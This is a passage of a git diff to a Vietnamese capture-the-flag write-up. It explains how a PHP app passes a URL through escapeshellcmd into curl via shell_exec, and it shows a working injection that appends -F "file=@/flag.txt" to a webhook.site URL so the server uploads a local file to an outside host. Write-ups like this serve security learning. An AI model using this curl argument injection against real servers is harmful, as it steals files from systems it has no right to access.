@@ -18,8 +18,8 @@ Sau khi đọc source code thì mình đã chú ý đến đoạn sau
 ![image](https://github.com/tthanhnguyen/CTF_cookie-Arena/assets/96458810/13979d67-2497-46a2-b74e-03602dd6c598)
 
 Có thê thấy trong code biến $url là untrusted data được đưa vào 1 hàm nguy hiểm như shell_exec xử lý. Đến đây việc còn lại là khai thác lỗi  Command Injection và làm sao để khai thác nó. Để thao túng được biến url ta phải dảm bảo 2 điều kiện 
-**1 là bắt đầu là http do strpos sẽ kiễm tra chuỗi nhập có bắt đầu là http không 
-2 là được filter bởi hàm **escapeshellcmd** thì trong PHP escapeshellcmd sẽ thoát khỏi các kí tự &#;`|*?~<>^()[]{}$\, \x0A and \xFF. ' và " **
+1 là bắt đầu là http do strpos sẽ kiễm tra chuỗi nhập có bắt đầu là http không 
+2 là được filter bởi hàm **escapeshellcmd** thì trong PHP escapeshellcmd sẽ thoát khỏi các kí tự (& # ; `| * ? ~ < > ^ ( ) [ ] { } $ \ , \ x0A and \xFF . ' và ")
 
 Nhận thấy curl được nối chuỗi với phần escapeshellcmd($url) mình đã thử nhiều cách nhưng vẫn không thu được kêt quả gì do vướng escapeshellcmd . Bỏ qua hướng tiếp cận bằng && ; thì mình thử tìm hiểu coi curl có thể làm được gì thì mình đã tìm ra được curl có cho phép mình gửi nội dung của file tới một server ngoài bằng -F (ex: curl -F "file=@/path/to/example.txt" https://api.example.com/upload). Tìm ra hướng đi mình bắt đầu thử nghiệm nó và server ngoài mình chọn để dùng là webhook.site và thực hiện input sau: https://webhook.site/1560d9e5-0482-4a96-b3d0-d1583a783b90 -F "file=@/flag.txt"
 ![image](https://github.com/tthanhnguyen/CTF_cookie-Arena/assets/96458810/f7f80235-6165-4d2b-911d-8740724ab665) và ngay lập tức webhook mình nhận được gói tin
